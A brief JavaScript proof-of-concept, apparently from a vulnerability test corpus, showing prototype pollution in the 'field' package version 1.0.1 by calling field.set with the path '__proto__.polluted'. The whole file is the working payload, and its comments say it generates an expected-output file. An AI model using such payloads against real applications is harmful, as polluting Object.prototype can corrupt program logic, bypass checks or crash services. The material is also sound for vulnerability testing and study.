var field = require('./field@1.0.1')

// this PoC works for changing the value of an existed property, for example, toString
// we define the property `_polluted` in the prototype just to emulate the existed `polluted` property 
// and generate .PoC.expected automatically
Object.prototype._polluted = 1;
field.set({}, '__proto__.polluted', 'yes')
